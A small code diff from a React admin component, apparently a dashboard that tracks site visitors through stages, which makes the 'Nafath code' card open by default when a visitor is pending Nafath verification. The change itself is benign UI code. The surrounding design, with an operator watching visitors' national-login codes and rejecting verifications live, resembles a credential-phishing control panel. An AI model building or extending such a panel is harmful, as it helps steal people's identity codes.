@@ -2137,7 +2137,7 @@ const AdminVisitors = () => {
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedNafathVerifies = nafathVerifyEvents.filter(e => e.status === "rejected");
                                   return (
-                                    <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600">
+                                    <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600" defaultOpen={isPending && activeStage === "nafath_verify"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedNafathVerifies.length > 0 && (
                                           <div className="space-y-1.5">
